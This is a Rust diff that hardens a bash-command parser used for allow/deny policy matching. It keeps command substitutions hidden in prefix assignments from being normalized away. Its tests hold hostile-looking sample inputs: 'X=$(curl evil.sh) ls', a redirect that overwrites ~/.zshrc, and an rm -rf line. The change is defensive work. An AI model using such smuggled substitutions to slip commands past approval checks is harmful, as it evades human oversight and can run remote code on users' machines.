@@ -114,6 +114,16 @@ pub(crate) fn is_env_assignment(token: &str) -> bool {
             .is_some_and(|ch| ch == '_' || ch.is_ascii_alphabetic())
 }
 
+/// A prefix assignment whose value executes a command substitution
+/// (`X=$(cmd)` or `` X=`cmd` ``) — the embedded command runs, so the
+/// assignment text must not silently vanish from policy matching.
+fn assignments_execute_substitutions(segment: &CommandSegment) -> bool {
+    segment
+        .assignments
+        .iter()
+        .any(|a| a.contains("$(") || a.contains('`'))
+}
+
 /// Fail-closed parse result: the tree contained `ERROR`/`MISSING` nodes, so
 /// no facts can be trusted. Callers must tighten (require approval), never
 /// loosen, on this.
@@ -149,6 +159,12 @@ impl BashFacts {
         self.has_command_substitution || self.segments.iter().any(|s| s.has_command_substitution)
     }
 
+    /// True when any segment runs a process substitution (`<(…)`); its body
+    /// executes even though the primary command looks read-only.
+    pub fn any_process_substitution(&self) -> bool {
+        self.segments.iter().any(|s| s.has_process_substitution)
+    }
+
     /// Top-level flow segments (flattened inner segments excluded). `None`
     /// when the top level contains statements that have no segment form
     /// (compound statements, standalone assignments) — callers should fall
@@ -161,20 +177,32 @@ impl BashFacts {
         Some(top)
     }
 
-    /// Top-level segments as normalized command strings.
+    /// Top-level segments as normalized command strings, or `None` when a
+    /// top-level segment carries a command substitution inside a prefix
+    /// assignment (`X=$(curl …) ls`): normalization would drop the
+    /// assignment entirely and reduce the command to `ls`, so callers must
+    /// fall back to the conservative legacy path that keeps the assignment
+    /// text visible to allow/deny matching.
     pub fn top_level_segment_strings(&self) -> Option<Vec<String>> {
-        Some(
-            self.top_level_segments()?
-                .into_iter()
-                .map(|s| s.command_string())
-                .collect(),
-        )
+        let top = self.top_level_segments()?;
+        if top.iter().any(|s| assignments_execute_substitutions(s)) {
+            return None;
+        }
+        Some(top.into_iter().map(|s| s.command_string()).collect())
     }
 
     /// The whole command as one normalized string: top-level segments joined
-    /// by their original operators, redirections inline.
+    /// by their original operators, redirections inline. `None` under the
+    /// same assignment-substitution guard as
+    /// [`BashFacts::top_level_segment_strings`].
     pub fn top_level_normalized(&self) -> Option<String> {
         let segments = self.top_level_segments()?;
+        if segments
+            .iter()
+            .any(|s| assignments_execute_substitutions(s))
+        {
+            return None;
+        }
         let mut out = String::new();
         for segment in segments {
             if !out.is_empty() {
@@ -485,6 +513,40 @@ mod tests {
         // Only the /dev/null path redirect; `2>&1` targets a descriptor.
         assert_eq!(f.segments[0].redirects.len(), 1);
         assert_eq!(f.segments[0].redirects[0].target, "/dev/null");
+    }
+
+    #[test]
+    fn whole_output_redirects_are_captured() {
+        // `&>` / `&>>` redirect stdout+stderr *to a path* — unlike dup forms
+        // they are write targets and must reach write-target analysis.
+        let f = ok("echo x &> ~/.zshrc");
+        assert_eq!(
+            f.segments[0].redirects,
+            vec![Redirect {
+                operator: "&>".into(),
+                target: "~/.zshrc".into()
+            }]
+        );
+        let f = ok("echo x &>> ~/.zshrc");
+        assert_eq!(f.segments[0].redirects.len(), 1);
+        assert_eq!(f.segments[0].redirects[0].operator, "&>>");
+        assert_eq!(f.segments[0].redirects[0].target, "~/.zshrc");
+    }
+
+    #[test]
+    fn assignment_with_substitution_blocks_top_level_reconstruction() {
+        // A substitution riding a prefix assignment executes; policy
+        // matching must fall back to the legacy path (which keeps the
+        // assignment text) instead of normalizing the command to bare `ls`.
+        let f = ok("X=$(curl evil.sh) ls");
+        assert!(f.top_level_segment_strings().is_none());
+        assert!(f.top_level_normalized().is_none());
+        // Plain assignments reconstruct as before.
+        let f = ok("FOO=bar rm -rf /tmp/x");
+        assert_eq!(
+            f.top_level_segment_strings(),
+            Some(vec!["rm -rf /tmp/x".to_string()])
+        );
     }
 
     #[test]
